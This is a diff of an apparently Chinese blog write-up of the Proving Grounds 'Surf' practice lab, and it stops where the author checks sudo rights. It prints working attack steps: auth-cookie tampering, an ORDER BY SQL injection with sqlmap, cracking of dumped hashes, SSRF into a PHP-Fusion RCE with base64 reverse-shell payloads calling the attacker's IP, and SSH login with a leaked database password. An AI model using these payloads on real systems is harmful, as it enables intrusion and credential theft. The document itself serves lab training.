@@ -10,7 +10,7 @@
 <meta name="description" content="Xavier&#39;s Blog" /><meta name="keywords" content='OSCP, PG_Practice' /><meta itemprop="name" content="ProvingGrouds Surf WriteUp">
 <meta itemprop="description" content=""><meta itemprop="datePublished" content="2024-01-02T20:48:15+08:00" />
 <meta itemprop="dateModified" content="2024-01-02T20:48:15+08:00" />
-<meta itemprop="wordCount" content="2113">
+<meta itemprop="wordCount" content="2323">
 <meta itemprop="keywords" content="OSCP,PG_Practice," /><meta property="og:title" content="ProvingGrouds Surf WriteUp" />
 <meta property="og:description" content="" />
 <meta property="og:type" content="article" />
@@ -32,7 +32,7 @@
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "https:\/\/www.bthoughts.top\/posts\/provinggrouds_surf_writeup\/"
-    },"genre": "posts","keywords": "OSCP, PG_Practice","wordcount":  2113 ,
+    },"genre": "posts","keywords": "OSCP, PG_Practice","wordcount":  2323 ,
     "url": "https:\/\/www.bthoughts.top\/posts\/provinggrouds_surf_writeup\/","datePublished": "2024-01-02T20:48:15+08:00","dateModified": "2024-01-02T20:48:15+08:00","publisher": {
       "@type": "Organization",
       "name": ""},"author": {
@@ -189,7 +189,7 @@
       </h1></div><div class="post-meta">
       <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/resource/friends/me.jpeg" srcset="/resource/friends/me.jpeg, /resource/friends/me.jpeg 1.5x, /resource/friends/me.jpeg 2x" sizes="auto" data-title="Xavier" data-alt="Xavier" class="avatar" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>&nbsp;Xavier</span></span>
           <span class="post-category">收录于 <a href="/categories/%E9%9D%B6%E5%9C%BA/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 靶场</a></span></div>
-      <div class="post-meta-line"><span title=2024-01-02&#32;20:48:15><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-01-02">2024-01-02</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 2113 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 5 分钟</span>&nbsp;</div>
+      <div class="post-meta-line"><span title=2024-01-02&#32;20:48:15><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-01-02">2024-01-02</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 2323 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 5 分钟</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>目录</span>
@@ -204,7 +204,37 @@
 </nav></div>
       </div><div class="content" id="content" data-end-flag="It&#39;s end."><h2 id="端口扫描">端口扫描：</h2>
 <p>整理</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/surf<span class="o">]</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/surf<span class="o">]</span>
 </span></span><span class="line"><span class="cl">└─$ sudo nmap -n -r --min-rate<span class="o">=</span><span class="m">3500</span> -p- -sSV --script default,vuln 192.168.162.171 -oN surf-all.txt 
 </span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> xavier 的密码：
 </span></span><span class="line"><span class="cl">Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-12-03 14:59 CST
@@ -230,21 +260,93 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 </span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 95.76 seconds
-</span></span></code></pre></div><h2 id="web扫描">Web扫描</h2>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="web扫描">Web扫描</h2>
 <p>访问 80端口Web服务，是个博客，文章作者是Admin。</p>
 <p>Web扫描</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/surf<span class="o">]</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/surf<span class="o">]</span>
 </span></span><span class="line"><span class="cl">└─$ dirsearch -x 400,404  -t <span class="m">500</span> -e php,asp,aspx,ini,txt,bak -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.162.171 
-</span></span></code></pre></div><p>发现管理后台登录口：http://192.168.162.171/administration/login.php</p>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现管理后台登录口：http://192.168.162.171/administration/login.php</p>
 <p>尝试暴破，失败</p>
 <p>登录失败的返回包中有这个头<code>Set-Cookie: auth_status=eydzdWNjZXNzJzonZmFsc2UnfQ%3D%3D</code>，base64接码后为<code>{'success':'false'}</code></p>
 <p>抓包改包，手动修改为true后进入后台，绕过前端限制。</p>
 <p>发现有个页面，测试发现存在order by点位的注入</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">http://192.168.162.171/administration/customers.php?search_string<span class="o">=</span>c<span class="p">&amp;</span><span class="nv">filter_col</span><span class="o">=</span><span class="k">if</span><span class="o">((</span>substr<span class="o">(</span>version<span class="o">()</span>,1,1<span class="o">)=</span><span class="s1">&#39;8&#39;</span><span class="o">)</span>,id,phone<span class="o">)</span><span class="p">&amp;</span><span class="nv">order_by</span><span class="o">=</span>asc
-</span></span></code></pre></div><p>测试发现后端SQL语句为：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">SQL_CALC_FOUND_ROWS</span><span class="w"> </span><span class="n">id</span><span class="p">,</span><span class="w"> </span><span class="n">f_name</span><span class="p">,</span><span class="w"> </span><span class="n">l_name</span><span class="p">,</span><span class="w"> </span><span class="n">gender</span><span class="p">,</span><span class="w"> </span><span class="n">phone</span><span class="p">,</span><span class="w"> </span><span class="n">created_at</span><span class="p">,</span><span class="w"> </span><span class="n">updated_at</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">customers</span><span class="w"> </span><span class="k">WHERE</span><span class="w">  </span><span class="n">f_name</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="o">?</span><span class="w">  </span><span class="k">OR</span><span class="w"> </span><span class="n">l_name</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="o">?</span><span class="w">  </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="k">ASC</span><span class="w">  </span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">15</span><span class="w"> 
-</span></span></span></code></pre></div><p>因为不是考试，想偷懒，于是用上了sqlmap</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/surf<span class="o">]</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">http://192.168.162.171/administration/customers.php?search_string<span class="o">=</span>c<span class="p">&amp;</span><span class="nv">filter_col</span><span class="o">=</span><span class="k">if</span><span class="o">((</span>substr<span class="o">(</span>version<span class="o">()</span>,1,1<span class="o">)=</span><span class="s1">&#39;8&#39;</span><span class="o">)</span>,id,phone<span class="o">)</span><span class="p">&amp;</span><span class="nv">order_by</span><span class="o">=</span>asc
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>测试发现后端SQL语句为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">SQL_CALC_FOUND_ROWS</span><span class="w"> </span><span class="n">id</span><span class="p">,</span><span class="w"> </span><span class="n">f_name</span><span class="p">,</span><span class="w"> </span><span class="n">l_name</span><span class="p">,</span><span class="w"> </span><span class="n">gender</span><span class="p">,</span><span class="w"> </span><span class="n">phone</span><span class="p">,</span><span class="w"> </span><span class="n">created_at</span><span class="p">,</span><span class="w"> </span><span class="n">updated_at</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">customers</span><span class="w"> </span><span class="k">WHERE</span><span class="w">  </span><span class="n">f_name</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="o">?</span><span class="w">  </span><span class="k">OR</span><span class="w"> </span><span class="n">l_name</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="o">?</span><span class="w">  </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="k">ASC</span><span class="w">  </span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">15</span><span class="w"> 
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>因为不是考试，想偷懒，于是用上了sqlmap</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/surf<span class="o">]</span>
 </span></span><span class="line"><span class="cl">└─$ sqlmap -r sqli.txt --banner --level<span class="o">=</span><span class="m">3</span> --risk<span class="o">=</span><span class="m">3</span> -p <span class="s1">&#39;filter_col&#39;</span> --batch
 </span></span><span class="line"><span class="cl">……
 </span></span><span class="line"><span class="cl">GET parameter <span class="s1">&#39;filter_col&#39;</span> is vulnerable. Do you want to keep testing the others <span class="o">(</span><span class="k">if</span> any<span class="o">)</span>? <span class="o">[</span>y/N<span class="o">]</span> N
@@ -288,9 +390,34 @@
 </span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">11</span> <span class="p">|</span> NULL      <span class="p">|</span> NULL    <span class="p">|</span> <span class="nv">$2</span>y<span class="nv">$10$7</span>y1lSqjchay03PgTMMW6a.wtR9CosWV4tLSaycUhcXQLvT.PJtiLm <span class="p">|</span> james     <span class="p">|</span> super      <span class="p">|</span> NULL           <span class="p">|</span>
 </span></span><span class="line"><span class="cl">+----+-----------+---------+--------------------------------------------------------------+-----------+------------+----------------+
 </span></span><span class="line"><span class="cl">……
-</span></span></code></pre></div><p>拿到管理员密码哈希</p>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>拿到管理员密码哈希</p>
 <p>尝试解密</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/surf<span class="o">]</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/surf<span class="o">]</span>
 </span></span><span class="line"><span class="cl">└─$ hashid <span class="s1">&#39;$2y$10$7y1lSqjchay03PgTMMW6a.wtR9CosWV4tLSaycUhcXQLvT.PJtiLm&#39;</span>
 </span></span><span class="line"><span class="cl">Analyzing <span class="s1">&#39;$2y$10$7y1lSqjchay03PgTMMW6a.wtR9CosWV4tLSaycUhcXQLvT.PJtiLm&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Blowfish<span class="o">(</span>OpenBSD<span class="o">)</span> 
@@ -309,11 +436,28 @@
 </span></span><span class="line"><span class="cl">                                                                                                                                                                                                              
 </span></span><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/surf<span class="o">]</span>
 </span></span><span class="line"><span class="cl">└─$ hashcat -m <span class="m">3200</span> james.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
-</span></span></code></pre></div><p>这是个兔子洞</p>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这是个兔子洞</p>
 <p>又找到了另一个点</p>
 <p><img loading="lazy" src="/resource/%e9%9d%b6%e6%9c%ba-PG_Surf_WriteUp/image-20231203175500444.png" srcset="/resource/%e9%9d%b6%e6%9c%ba-PG_Surf_WriteUp/image-20231203175500444.png, /resource/%e9%9d%b6%e6%9c%ba-PG_Surf_WriteUp/image-20231203175500444.png 1.5x, /resource/%e9%9d%b6%e6%9c%ba-PG_Surf_WriteUp/image-20231203175500444.png 2x" sizes="auto" data-title="image-20231203175500444" data-alt="image-20231203175500444" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p>搜索历史漏洞发现有RCE</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/surf<span class="o">]</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/surf<span class="o">]</span>
 </span></span><span class="line"><span class="cl">└─$ searchsploit phpfusion
 </span></span><span class="line"><span class="cl">-------------------------------------------------------------- ---------------------------------
 </span></span><span class="line"><span class="cl"> Exploit Title                                                <span class="p">|</span>  Path
@@ -324,8 +468,29 @@
 </span></span><span class="line"><span class="cl">-------------------------------------------------------------- ---------------------------------
 </span></span><span class="line"><span class="cl">Shellcodes: No Results
 </span></span><span class="line"><span class="cl">Papers: No Results
-</span></span></code></pre></div><p>通过SSRF打漏洞</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/administration/checkserver.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>通过SSRF打漏洞</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/administration/checkserver.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
 </span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">192.168.162.171</span>
 </span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0</span>
 </span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
@@ -340,19 +505,61 @@
 </span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">url=http%3A%2F%2F127.0.0.1%3A8080//infusions/downloads/downloads.php?cat_id=$%5C%7Bsystem(base64_decode(cGhwIC1yICckc29jaz1mc29ja29wZW4oIjE5Mi4xNjguNDUuMTk3Iiw5MDAyKTtleGVjKCIvYmluL2Jhc2ggLWkgPCY0ID4mNCAyPiY0Iik7JyAg)).exit%5C%7D
-</span></span></code></pre></div><p>问题是shell一连上就直接断了</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/surf<span class="o">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>问题是shell一连上就直接断了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/surf<span class="o">]</span>
 </span></span><span class="line"><span class="cl">└─$ nc -nlvp <span class="m">9002</span> 
 </span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9002</span> ...
 </span></span><span class="line"><span class="cl">connect to <span class="o">[</span>192.168.45.197<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.162.171<span class="o">]</span> <span class="m">34322</span>
-</span></span></code></pre></div><p>最后成功的payload</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nv">url</span><span class="o">=</span>http%3A%2F%2F127.0.0.1%3A8080//infusions/downloads/downloads.php?cat_id<span class="o">=</span>$%5C%7Bsystem<span class="o">(</span>base64_decode<span class="o">(</span>cGhwIC1yICdleGVjKCJuYyAxOTIuMTY4LjQ1LjE5NyA4MCAtZSAvYmluL3NoIik7JyAg<span class="o">))</span>.exit%5C%7D
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>最后成功的payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nv">url</span><span class="o">=</span>http%3A%2F%2F127.0.0.1%3A8080//infusions/downloads/downloads.php?cat_id<span class="o">=</span>$%5C%7Bsystem<span class="o">(</span>base64_decode<span class="o">(</span>cGhwIC1yICdleGVjKCJuYyAxOTIuMTY4LjQ1LjE5NyA4MCAtZSAvYmluL3NoIik7JyAg<span class="o">))</span>.exit%5C%7D
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1"># 解码后</span>
 </span></span><span class="line"><span class="cl">http://127.0.0.1:8080//infusions/downloads/downloads.php?cat_id<span class="o">=</span>$<span class="se">\{</span>system<span class="o">(</span>base64_decode<span class="o">(</span>cGhwIC1yICdleGVjKCJuYyAxOTIuMTY4LjQ1LjE5NyA4MCAtZSAvYmluL3NoIik7JyAg<span class="o">))</span>.exit<span class="se">\}</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">php -r <span class="s1">&#39;exec(&#34;nc 192.168.45.197 80 -e /bin/sh&#34;);&#39;</span>  
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/surf<span class="o">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/surf<span class="o">]</span>
 </span></span><span class="line"><span class="cl">└─$ nc -nlvp <span class="m">80</span>
 </span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">80</span> ...
 </span></span><span class="line"><span class="cl">connect to <span class="o">[</span>192.168.45.197<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.162.171<span class="o">]</span> <span class="m">54366</span>
@@ -366,14 +573,48 @@
 </span></span><span class="line"><span class="cl">a4e66109b23dd0df9165c992668efe14
 </span></span><span class="line"><span class="cl">python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">www-data@Surf:/var/www/html/infusions/downloads$
-</span></span></code></pre></div><h2 id="权限提升">权限提升</h2>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="权限提升">权限提升</h2>
 <p>linpeas信息搜集</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">╔══════════╣ Searching passwords in config PHP files
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">╔══════════╣ Searching passwords in config PHP files
 </span></span><span class="line"><span class="cl"><span class="nv">$locale</span><span class="o">[</span><span class="s1">&#39;853&#39;</span><span class="o">]</span> <span class="o">=</span> <span class="s2">&#34;Admin Password:&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">define<span class="o">(</span><span class="s1">&#39;DB_PASSWORD&#39;</span>, <span class="s2">&#34;FlyToTheMoon213!&#34;</span><span class="o">)</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">define<span class="o">(</span><span class="s1">&#39;DB_USER&#39;</span>, <span class="s2">&#34;core&#34;</span><span class="o">)</span><span class="p">;</span>
-</span></span></code></pre></div><p>拿到密码，试出来是james的</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/surf<span class="o">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>拿到密码，试出来是james的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/surf<span class="o">]</span>
 </span></span><span class="line"><span class="cl">└─$ sshpass -p <span class="s1">&#39;FlyToTheMoon213!&#39;</span> ssh james@192.168.162.171
 </span></span><span class="line"><span class="cl">Linux Surf 4.19.0-18-amd64 <span class="c1">#1 SMP Debian 4.19.208-1 (2021-09-29) x86_64</span>
 </span></span><span class="line"><span class="cl">
@@ -391,8 +632,33 @@
 </span></span><span class="line"><span class="cl">james@Surf:~$ cat local.txt 
 </span></span><span class="line"><span class="cl">a4e66109b23dd0df9165c992668efe14
 </span></span><span class="line"><span class="cl">james@Surf:~$ 
-</span></span></code></pre></div><p>查看sudo权限</p>
